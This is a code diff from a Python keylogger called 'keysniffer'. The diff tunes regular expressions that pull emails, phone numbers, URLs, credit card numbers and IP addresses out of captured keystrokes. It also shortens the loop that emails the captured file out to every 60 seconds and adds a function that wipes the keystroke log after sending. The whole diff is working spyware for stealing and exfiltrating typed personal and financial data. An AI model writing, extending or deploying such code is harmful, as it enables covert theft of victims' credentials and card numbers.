@@ -118,12 +118,11 @@ def extract_valuable_info(keysniffer_data, filtered_data, interval=5):
         # Define patterns for valuable information
         patterns = {
             "emails": r"[\w\.-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}",  # Generalized for various domains
-            "phone_numbers": r"\+?(\d{1,3}[-\s]?)?(\(?\d{1,4}\)?[-\s]?\d{1,4}[-\s]?\d{1,4})",  # Flexible formats
+            "phone_numbers": r"\+(\d{3})\s(\d{3})\s(\d{3})\s(\d{3})",
             "urls": r"https?://(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?:/[^\s]*)?",  # Better handling for different URL structures
             "credit_cards": r"\b(?:\d{4}[-\s]?){3}\d{4}\b|LU\d{18}\b",  # Handling different formats for credit card numbers
-            "ip_addresses": r"\b(?:\d{1,3}\.){3}\d{1,3}\b|\b(?:[a-f0-9]{1,4}:){7}[a-f0-9]{1,4}\b",  # Supports both IPv4 and IPv6
+            "IPv4 / IPv6": r"\b(?:\d{1,3}\.){3}\d{1,3}\b|\b(?:[a-f0-9]{1,4}:){7}[a-f0-9]{1,4}\b",  # Supports both IPv4 and IPv6
             "dates": r"\b(?:\d{1,2}[-/.]?\d{1,2}[-/.]?\d{4}|\d{4}[-/.]?\d{1,2}[-/.]?\d{1,2})\b",  # More date formats
-            "social_security_numbers": r"\b\d{3}[-\s]?\d{2}[-\s]?\d{4}\b",  # Improved SSN format
         }
 
         extracted_data = {}
@@ -212,16 +211,26 @@ def send_email():
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
             print("Email sent successfully.")
-
     except Exception as e:
         print(f"An error occurred: {e}")
 
 
 def send_email_periodically():
-    # Sends the filtered data file as an email attachment every 5 minutes.
+    # Sends the filtered data file as an email attachment
     while True:
         send_email()
-        time.sleep(120)  # Wait for 1 minutes
+        time.sleep(60)  # Wait for 1 minutes
+
+
+# ===================================================== Daily File Deletion =====================================================
+
+
+def restore_files():
+
+    # Clear the contents of keysniffer_data.txt
+    time.sleep(65)
+    with open("keysniffer_data.txt", "w") as file:
+        file.truncate(0)
 
 
 # ===================================================== Running the Program ======================================================
